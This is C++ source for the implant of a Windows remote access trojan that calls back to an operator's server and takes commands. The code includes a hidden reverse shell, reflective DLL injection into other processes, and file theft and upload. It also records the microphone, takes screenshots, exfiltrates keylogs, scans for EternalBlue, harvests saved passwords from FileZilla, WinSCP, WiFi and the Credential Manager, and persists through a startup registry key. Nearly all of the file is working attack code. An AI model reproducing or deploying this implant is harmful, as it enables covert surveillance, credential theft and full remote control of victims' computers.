#include "Probe.h"
#include "ReflectiveOutput.h"
#include "PassCat.h"

using namespace Network;
using namespace System;
using namespace Server;


// r3M0te H@cker Probe
// char key[] = {'r','3','M','0','t','3', 'H','@','c','k','e','r', 'P','r','o','b','e'}; 
LPVOID lpRemoteCommandLine = NULL;
struct sockaddr_in server;
SOCKET sockfd;
char recvbuf[BUFFER] = { 0 };
int fsize = 0;
char* fileinfo[3];
char temp[BUFFER];
TOKEN_PRIVILEGES priv = { 0 };
HANDLE hModule = NULL;
HANDLE hProcess = NULL;
HANDLE hToken = NULL;

char titlebuf[BUFFER] = { 0 };
char messagebuf[BUFFER] = { 0 };
int MESSAGE_BOX_MODE;

#define BREAK_WITH_ERROR( e ) { sockprintf( "F_ERR%s. Error=%ld", e, GetLastError() ); break; }

// Show a messagebox without blocking
void System::MessageBoxShow()
{
    // MESSAGE_BOX_MODE modes
    // 0 = information
    // 1 = warning
    // 2 = error

    switch (MESSAGE_BOX_MODE)
    {
    case 0:
        MessageBox(NULL, messagebuf, titlebuf, MB_ICONINFORMATION);
        break;

    case 1:
        MessageBox(NULL, messagebuf, titlebuf, MB_ICONWARNING);
        break;

    case 2:
        MessageBox(NULL, messagebuf, titlebuf, MB_ICONERROR);
        break;

    default:
        MessageBox(NULL, messagebuf, titlebuf, MB_ICONINFORMATION);
        break;
    }
}

void Server::sockprintf(const char* words, ...) {
    static char textBuffer[BUFFER];
    memset(textBuffer, '\0', BUFFER);
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    sockSend(textBuffer);
}

void Server::sockSend(const char* data)
{
    int lerror = WSAGetLastError();
    int totalsent = 0;
    int buflen = strlen(data);
    while (buflen > totalsent) {
        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
        if (lerror == WSAECONNRESET)
        {
            connected = FALSE;
        }
        if (r < 0) return;
        totalsent += r;
    }
    return;
}



void Server::ExecSock(SOCKET sockfd, char recvbuf[BUFFER])
{
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sockfd;
    if (CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
    else {
        sockprintf("Failed to Create Process, Error : %ld\n", GetLastError());
    }
}

DWORD System::ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

void System::split(char* src, char* dest[5], const char* delimeter) {
    // Only split if delimeter does exist in the source string
    if (strstr(src, delimeter) != NULL)
    {
        int i = 0;
        char* p = strtok(src, delimeter);
        while (p != NULL)
        {
            dest[i++] = p;
            p = strtok(NULL, delimeter);
        }
    }
}



void Server::StartWSA(void)
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        //printf("[Error] Error Starting Winsock.");
        //exit(1);
    }
}


void Server::ProbeConnect(const char* ip, int Port)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        //exit(1);
    }
    /*
    std::string info = LoadInfo::GetServerInfo();
    char* values[3];
    split((char*)info.c_str(), values, ":");
    std::string Host(values[0]);
    std::string Port(values[1]);
    int Portnum = std::stoi(Port);
    */
    
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(Port);
    server.sin_family = AF_INET;
    
    int i = 0;
    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            connected = FALSE;
            i++;
        }
        else {
            connected = TRUE;
        }
    } while (!connected && i <=5);
 
    if (connected) {
        RHPMain();
    }
    
}

char* System::cDir()
{
    static char DIR[MAX_PATH];
    memset(DIR, '\0', MAX_PATH);
    GetCurrentDirectory(MAX_PATH, DIR);
    return (char*)DIR;
}

BOOL System::isFile(const char* file)
{
    DWORD dwAttrib = GetFileAttributes(file);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

/*
void Server::REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(2000);
    //ProbeConnect();
}*/


void Server::RHPMain(void)
{
    while (connected)
    {
        // Receive in temp
        Sleep(100);
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }


        if (strcmp(recvbuf, "checkhost") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }

            CheckHost(recvbuf);

        }

        else if (strcmp(recvbuf, "gethostname") == 0) {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            sockprintf("!hs!%s - %s", recvbuf, IP2Host(recvbuf));
        }

        else if (strcmp(recvbuf, "checkport") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(recvbuf, fileinfo, ",");
            checkPort(fileinfo[0], atoi(fileinfo[1]));
        }


        // Reflective DLL Injection over socket
        else if (strcmp(recvbuf, "fdll") == 0)
        {
            DWORD dwProcessId;
            memset(temp, '\0', BUFFER);
            int return_code = recv(sockfd, temp, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }
            split(temp, fileinfo, ";;");
            int expected = atoi(fileinfo[1]);
            if (strcmp(fileinfo[2], "None") == 0) {
                dwProcessId = GetCurrentProcessId();
            }
            else {
                dwProcessId = ProcessId(fileinfo[2]);
            }

            char* cpCommandLine = fileinfo[3];
            char* returnOutput = fileinfo[4]; // TRUE of FALSE
            int timeInterval;
            BOOL getOut = FALSE; // getOutput :'D
            if (strcmp(returnOutput, "TRUE") == 0)
            {
                timeInterval = atoi(fileinfo[5]);
                Prepare();
                getOut = TRUE;
            } 
            unsigned char* DLL = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, expected + 1);

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                    // printf("[X] Connection interrupted while receiving DLL\n");
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);

            do {
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

                    CloseHandle(hToken);
                }

                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");

                // alloc some space and write the commandline which we will pass to the injected dll...
                if (strcmp(cpCommandLine, "None") == 0) {
                    hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, NULL);
                    if (!hModule)
                        BREAK_WITH_ERROR("Failed to inject the DLL");
                }
                else {
                    lpRemoteCommandLine = VirtualAllocEx(hProcess, NULL, strlen(cpCommandLine) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                    if (!lpRemoteCommandLine)
                        BREAK_WITH_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");

                    if (!WriteProcessMemory(hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine) + 1, NULL))
                        BREAK_WITH_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");

                    hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, lpRemoteCommandLine);
                    if (!hModule)
                        BREAK_WITH_ERROR("Failed to inject the DLL");
                }



                WaitForSingleObject(hModule, -1);

                if (getOut)
                {
                    const char* output = ReadReflectiveDllOutput(timeInterval).c_str();
                    sockprintf("DLL_OUTPUT%s", output);
                }
                sockprintf("DLL_OK:%ld", dwProcessId);
            } while (0);

            if (DLL)
            {
                HeapFree(GetProcessHeap(), 0, DLL);

            }
            if (hProcess)
            {
                CloseHandle(hProcess);
            }

        }

        else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
        {

            int expected = 0; // expected bytes of size
            DWORD dwBytesWritten = 0; // number of bytes written
            BOOL write; // Return value of WriteFile();
            memset(temp, '\0', BUFFER); // Clear temp
            memset(fileinfo, '\0', 2);
            int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(temp, fileinfo, ":"); // split the received string with ':' delimeter. So at index 0, There is filename, And at index 1, There is filesize.
            expected = atoi(fileinfo[1]); // Convert filesize to integer. Filesize is the expected file size.
            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (recvfile == INVALID_HANDLE_VALUE) {
                sockprintf("F_ERR[Error Creating File] : %ld", GetLastError());
            }
            else {
                memset(recvbuf, '\0', BUFFER); // Clear main buffer
                int total = 0; // Total bytes received

                do { // IF Total is equal to expected bytes. Break the loop, And stop receiving.
                    fsize = recv(sockfd, recvbuf, BUFFER, 0); // Receive file
                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                    {
                        connected = FALSE;
                        printf("F_ERR[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                    }
                    else if (fsize == 0) {
                        break;
                    }
                    else {
                        write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
                        total += fsize; // Add number of bytes received to total.
                    }
                } while (total != expected);

                if (write == FALSE)
                {
                    sockprintf("F_ERR[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                }
                else {
                    sockprintf(

                        "F_OK,%s,%i,%s\\%s",
                        fileinfo[0],
                        total,
                        cDir(),
                        fileinfo[0]
                    );
                }
                CloseHandle(recvfile);
            }
        }

        else if (strstr(recvbuf, "fupload") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");

            int bytes_read;
            BOOL upload = TRUE;
            FILE* fs;

            do {

                for (int i = 0; i < 2; i++) {
                    if (*fileinfo[i] == '\0')
                    {
                        sockprintf("[ Invalid File Download Request ]\n");
                        upload = FALSE;
                        break;
                    }
                }

                // I'm using fopen instead of GetFileSizeEx because this is much easier for me and this works
                // IF you'd like to update this, fork and make a pull request, I will happily accept
                if (upload) {
                    if ((fs = fopen(fileinfo[1], "rb")) != NULL)
                    {
                        fseek(fs, 0L, SEEK_END);
                        long filesize = ftell(fs);
                        fseek(fs, 0, SEEK_SET);

                        if (filesize <= 0) {
                            sockprintf("F_ERRFile '%s' is of 0 bytes.", fileinfo[1]);
                            fclose(fs);
                            upload = FALSE;
                            break;
                        }

                        sockprintf("FILE:%s:%ld", fileinfo[1], filesize);
                        Sleep(1000);
                        char fbuffer[500];
                        memset(fbuffer, '\0', 500);
                        while (!feof(fs)) {
                            if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                                send(sockfd, fbuffer, bytes_read, 0);
                            }
                            else {
                                upload = FALSE;
                                break;
                            }
                        }
                        fclose(fs);
                    }

                    else {
                        sockprintf("[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
                    }
                }
                // important
                upload = FALSE;

            } while (upload);

        }
        // =====================================

        else if (strcmp(recvbuf, "RHP_1") == 0) {
            char username[UNLEN + 1];
            char hostname[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD len = UNLEN + 1;
            DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
            GetUserNameA(username, &len);
            GetComputerNameA(hostname, &hlen);
            sockprintf("%s / %s", username, hostname);
        }

        else if (strcmp(recvbuf, "RHP_2") == 0)
        {
            char* wanip[BUFFER];
            HINTERNET hInternet, hFile;
            DWORD rSize;
            if (InternetCheckConnection("http://www.google.com", 1, 0)) {
                memset(wanip, '\0', BUFFER);
                hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                hFile = InternetOpenUrl(hInternet, "https://myexternalip.com/raw", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
                wanip[rSize] = reinterpret_cast<char*>('\0');

                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                sockprintf("%s", wanip);
            }
            else {
                sockprintf("No Internet Connection detected ...");
            }
        } 

        else if (strcmp(recvbuf, "RHP_3") == 0)
        {
            OS();
        }

        else if (strcmp(recvbuf, "RHPTYPE") == 0)
        {
            sockprintf("%s", CLIENT_TYPE);
        }

        else if (strcmp(recvbuf, "RHPPATH") == 0)
        {
            sockprintf("%s", MyLocation().c_str());
        }

        // kill
        
        else if (strcmp(recvbuf, "kill") == 0)
        {
            connected = FALSE;
            break;
        }
        

        else if (strcmp(recvbuf, "listdir") == 0)
        {
            ListDir();
        }



        // change directory
        else if (strcmp(recvbuf, "cd") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }

            if (!SetCurrentDirectory(recvbuf))
            {
                int x = GetLastError(); // Should this be integer?
                // on line 22 I'm using %ld to print the error, it works, What??
                switch (x) {
                case 2:
                    sockprintf("DIRERRORError Changing Directory to %s, File or Folder not Found (Error code %i)", recvbuf, x);
                    break;
                case 3:
                    sockprintf("DIRERRORError Changing Directory to %s, Path not found (Error Code %i)", recvbuf, x);
                    break;
                case 5:
                    sockprintf("DIRERRORError Changing Directory to %s, Access Denied (Error Code %i)", recvbuf, x);
                    break;
                default:
                    sockprintf("DIRERRORError Changing Directory to %s, Error %i", recvbuf, x);
                    break;
                }
            }
        }

        // delete file
        else if (strstr(recvbuf, "delete") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            if (isFile(fileinfo[1]))
            {
                if (DeleteFile(fileinfo[1]))
                {
                    sockprintf("DEL_OK,%s,%s", fileinfo[1], cDir());
                }
                else {
                    sockprintf("Error Deleting file : %i", GetLastError());
                }

            }
            else {
                sockprintf("F_ERRFile '%s' does not exist.", fileinfo[1]);
            }
        }

        else if (strstr(recvbuf, "psinfo") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            char FILEPATH[BUFFER];
            memset(FILEPATH, '\0', BUFFER);
            DWORD pid = ProcessId(fileinfo[1]);
            HANDLE procHandle;
            if (pid != 0)
            {
                procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                if (procHandle != NULL) {
                    if (GetModuleFileNameEx(procHandle, NULL, FILEPATH, MAX_PATH) != 0)
                    {
                        // Send Process name, pid, and path back
                        sockprintf("PROCESS,%s,%ld,%s", fileinfo[1], pid, FILEPATH);
                    }
                    else {
                        sockprintf("PROCESS,%s,%ld,(error : %ld)", fileinfo[1], pid, GetLastError());
                    }
                    CloseHandle(procHandle);
                }
                else {
                    sockprintf("F_ERRFailed to open Process : %s", fileinfo[1]);
                }
            }
            else {
                sockprintf("F_ERRProcess not running.");
            }
        }

        else if (strstr(recvbuf, "pkill") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            DWORD procid = ProcessId(fileinfo[1]);
            HANDLE FP;

            if (procid != 0) {
                FP = OpenProcess(PROCESS_ALL_ACCESS, false, procid);
                TerminateProcess(FP, 1);
                CloseHandle(FP);
                sockprintf("P_OKProcess '%s' running at PID '%ld' Terminated.", fileinfo[1], procid);
            }
            else {
                sockprintf("F_ERRError Terminating Process : %s (Error %ld)", fileinfo[1], GetLastError());
            }

        }
        else if (strcmp(recvbuf, "eternal_scan") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }

            EternalBlueScan(recvbuf);

        }

        else if (strcmp(recvbuf, "screenshot") == 0) {
            CaptureAnImage(GetDesktopWindow(), sockfd);
        }

        else if (strcmp(recvbuf, "micstart") == 0)
        {
            mciSendString("open new type waveaudio alias RHP", NULL, 0, NULL);
            mciSendString("set time format ms", NULL, 0, NULL);
            mciSendString("record RHP notify", NULL, 0, NULL);
            sockprintf("MIC_OK:Now recording microphone.");
        }
        else if (strstr(recvbuf, "micstop") != NULL)
        {
            FILE* fs; int bytes_read;
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");
            char filename[200];
            memset(filename, '\0', 200);
            snprintf(filename, 200, "save RHP %s", fileinfo[1]);
            mciSendString("stop RHP", NULL, 0, NULL);
            mciSendString(filename, NULL, 0, NULL);
            mciSendString("close RHP", NULL, 0, NULL);

            if ((fs = fopen(fileinfo[1], "rb")) != NULL)
            {
                fseek(fs, 0L, SEEK_END);
                long filesize = ftell(fs);
                fseek(fs, 0, SEEK_SET);

                if (filesize <= 0) {
                    sockprintf("F_ERRFile '%s' is of 0 bytes.", fileinfo[1]);
                    fclose(fs);
                    break;
                }

                sockprintf("MIC:%s:%ld", fileinfo[1], filesize);
                Sleep(1000);
                char fbuffer[500];
                memset(fbuffer, '\0', 500);
                while (!feof(fs)) {
                    if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                        send(sockfd, fbuffer, bytes_read, 0);
                    }
                    else {
                        break;
                    }
                }
                fclose(fs);

                DeleteFile(fileinfo[1]);
            }

            else {
                sockprintf("F_ERR[ Error Opening file %s (Error %ld) ]", fileinfo[1], GetLastError());
            }

        }


        else if (strcmp(recvbuf, "poweroff") == 0)
        {
            poweroff(0);
        }

        else if (strcmp(recvbuf, "restart") == 0)
        {
            poweroff(2);
        }

        // persist:foldername:filename
        else if (strstr(recvbuf, "persist") != NULL)
        {
            char installPath[BUFFER];
            char installDir[BUFFER];
            memset(installPath, '\0', BUFFER);
            memset(installDir, '\0', BUFFER);

            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");


            memset(installPath, '\0', BUFFER);
            snprintf(installPath, BUFFER, "%s\\%s\\%s", appDataPath(), fileinfo[1], fileinfo[2]);
            memset(installDir, '\0', BUFFER);
            snprintf(installDir, BUFFER, "%s\\%s\\", appDataPath(), fileinfo[1]);
            CreateDirectory(installDir, NULL);


            BOOL chck = CopyFile(MyLocation().c_str(), installPath, FALSE);

            if (chck)
            {
                sockprintf("F_ERRCopied to '%s'", installPath);
            }
            else {
                sockprintf("F_ERRError Copying to '%s' to '%s'. Last Error : %ld\n", MyLocation().c_str(), installPath, GetLastError());
            }

        }
        // startupkey=path=name
        else if (strstr(recvbuf, "startupkey") != NULL)
        {
            // index 0 : startupkey
            // index 1 : Path to file
            // index 2 : Name for key
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, "=");

            char fd[200];
            memset(fd, '\0', 200);
            snprintf(fd, 200, "%s\\%s", cDir(), MyLocation().c_str());

            if (strcmp(fileinfo[1], "NULL") == 0)
            {
                StartupKey(fileinfo[2], fd);
            }
            else {
                StartupKey(fileinfo[2], fileinfo[1]);
            }

        }

        // MESSAGE Box trigger : msgbox:mode (for example : msgbox:2)
        else if (strstr(recvbuf, "msgbox") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");

            MESSAGE_BOX_MODE = atoi(fileinfo[1]);

            // Get the Title 
            memset(titlebuf, '\0', BUFFER);
            int rt = recv(sockfd, titlebuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }

            // Get The Message 
            memset(messagebuf, '\0', BUFFER);
            int return_code = recv(sockfd, messagebuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }

            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)System::MessageBoxShow, NULL, 0, NULL);
            sockprintf("F_ERRDisplaying message box.\nTitle : %s\nMessage : %s\nMode : %i", titlebuf, messagebuf, MESSAGE_BOX_MODE);

        }

        // openurl = http://test.com
        else if (strstr(recvbuf, "openurl") != NULL)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, "=");
            ShellExecute(NULL, "open", fileinfo[1], NULL, NULL, SW_SHOWNORMAL);
            sockprintf("F_ERROpened URL '%s'", fileinfo[1]);
        }

        else if (strcmp(recvbuf, "drives") == 0)
        {
            char ld[MAX_PATH];
            std::ostringstream drive;
            drive.clear(); drive.str("");
            DWORD dv = GetLogicalDriveStrings(MAX_PATH, (LPSTR)ld);
            if (dv > 0 && dv <= MAX_PATH)
            {
                char* szSingleDrive = ld;
                while (*szSingleDrive)
                {
                    drive << "drive:" << szSingleDrive << ",";
                    szSingleDrive += strlen(szSingleDrive) + 1;
                }
            }
            sockprintf("%s", drive.str().c_str());
        }

        else if (strcmp(recvbuf, "kls") == 0)
        {
            FILE* fs;
            int bytes_read;

            if ((fs = fopen(KeylogFileName(0).c_str(), "rb")) != NULL)
            {
                fseek(fs, 0L, SEEK_END);
                long filesize = ftell(fs);
                fseek(fs, 0, SEEK_SET);

                if (filesize <= 0) {
                    sockprintf("File '%s' is of 0 bytes.", KeylogFileName(1).c_str());
                    fclose(fs);
                    break;
                }

                sockprintf("KEYLOGS:%s:%ld", KeylogFileName(1).c_str(), filesize);
                Sleep(1000);
                char fbuffer[500];
                memset(fbuffer, '\0', 500);
                while (!feof(fs)) {
                    if ((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0) {
                        send(sockfd, fbuffer, bytes_read, 0);
                    }
                    else {
                        break;
                    }
                }
                fclose(fs);
            }
            else {
                sockprintf("F_ERRError Opening file %s (Error %ld)\nMost likely there are no keylogs.", KeylogFileName(0).c_str(), GetLastError());
            }

        }
        else if (strcmp(recvbuf, "rlclear") == 0)
        {
           if (isFile(KeylogFileName(0).c_str())){
                if (DeleteFile(KeylogFileName(0).c_str()))
                {
                    sockprintf("F_ERRKeylogs cleared : %s", KeylogFileName(0).c_str());
                }
                else {
                    sockprintf("F_ERRError Deleting file : %i\nMost likely there are no keylogs.", GetLastError());
                }

           }
        }
        
        else if (strcmp(recvbuf, "taskls") == 0)
        {
            SendProcessList();
        }

        else if (strcmp(recvbuf, "passcat") == 0)
        {
            libpasscat::init();
            sockSend("\n[PASSCAT]\n\nFileZila Passwords : \n------------------------------\n");
            libpasscat::cat_filezilla_passwords();
            sockSend("\n[PASSCAT]\n\nWifi Passwords : \n------------------------------\n");
            libpasscat::cat_wifi_passwords();
            sockSend("\n[PASSCAT]\n\nWinSCP Passwords : \n------------------------------\n");
            libpasscat::cat_winscp_passwords();
            sockSend("\n[PASSCAT]\nPidGin Passwords : \n------------------------------\n");
            libpasscat::cat_pidgin_passwords();
            sockSend("\n[PASSCAT]\n\nCredential Manager Passwords :\n------------------------------\n ");
            libpasscat::cat_credmanager_passwords();
            sockSend("\n[PASSCAT]\nVault and IE Passwords : \n------------------------------\n");
            libpasscat::cat_vault_ie_passwords();
            libpasscat::finalize();
        }

        // Receive Encrypted Shellcode with KEY
        /*
        if(recevied_string.startswith(RHPSH){
            
            key = received_string.split(":")[1]

            recv(SHELLCODE_ENCRYPTED)

            decrypted = SHELLCODE_ENCRYPTE.XORDECODE(key)
            
            CreateThread = ExecuteShellCode(decrypted)
        }

        */

        /*
        else if (strcmp(recvbuf, "RHPSH") == 0)
        {
            memset(fileinfo, '\0', 3);
            split(recvbuf, fileinfo, ":");

            const char* XORKEY = fileinfo[1];
            std::string strXorKey(XORKEY);
            int expected = atoi(fileinfo[3]);

            unsigned char* SHELLCODE = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, expected + 1);

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(SHELLCODE, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(SHELLCODE + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);

            ExecuteShellcode(SHELLCODE); // test


        }
        */

        else if (strcmp(recvbuf, "isadmin") == 0)
        {
            BOOL a = IsAdmin();
            if (a)
            {
                sockprintf("TRUE");
            }
            else {
                sockprintf("FALSE");
            }
        }

        else {
            ExecSock(sockfd, recvbuf);
        }

    }
    /*
    if (!connected)
    {
        break;
    }
    */


}

void System::ListDir() {
    WIN32_FIND_DATA data;
    HANDLE hFind;
    hFind = FindFirstFile("*", &data);
    std::ostringstream dir;
    if (hFind != INVALID_HANDLE_VALUE)
    {
        dir.clear(); dir.str("");
        dir << "RHPDIR<>" << cDir() << "\n";
        do {

            if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                dir << "^ " << data.cFileName << "\n";
            }
            else {
                ULONGLONG FileSize = data.nFileSizeHigh;
                FileSize <<= sizeof(data.nFileSizeHigh) * 8;
                FileSize |= data.nFileSizeLow;
                dir << data.cFileName << " (" << FileSize << " bytes)\n";
            }
        } while (FindNextFile(hFind, &data));

        sockSend(dir.str().c_str());
    }
}

void System::OS(void)
{
    int ret = 0.0;
    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osInfo;
    *reinterpret_cast<FARPROC*>(&RtlGetVersion) = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion)
    {
        osInfo.dwOSVersionInfoSize = sizeof osInfo;
        RtlGetVersion(&osInfo);
        ret = osInfo.dwMajorVersion;
    }
    int mw = osInfo.dwMinorVersion;
    if (ret == 5) {
        switch (mw)
        {
        case 0:
            // 5.0 = Windows 2000
            sockprintf("Windows 2000");
            break;
        case 1:
            // 5.1 = Windows XP
            sockprintf("Windows 2000");
            break;

        case 2:
            sockprintf("Windows XP Professional");
            break;

        default:
            sockprintf("Windows %i", mw);
            break;
        }
    }
    else if (ret == 6) {
        switch (mw)
        {
        case 0:
            sockprintf("Windows Vista");
            break;
        case 1:
            sockprintf("Windows 7");
            break;
        case 2:
            sockprintf("Windows 8");
            break;
        case 3:
            sockprintf("Windows 8.1");
            break;

        default:
            sockprintf("Windows %i", mw);
            break;
        }
    }
    else if (ret == 10) {
        sockprintf("Windows 10");
    }
    else {

        sockprintf("Windows %i", mw);
    }
}
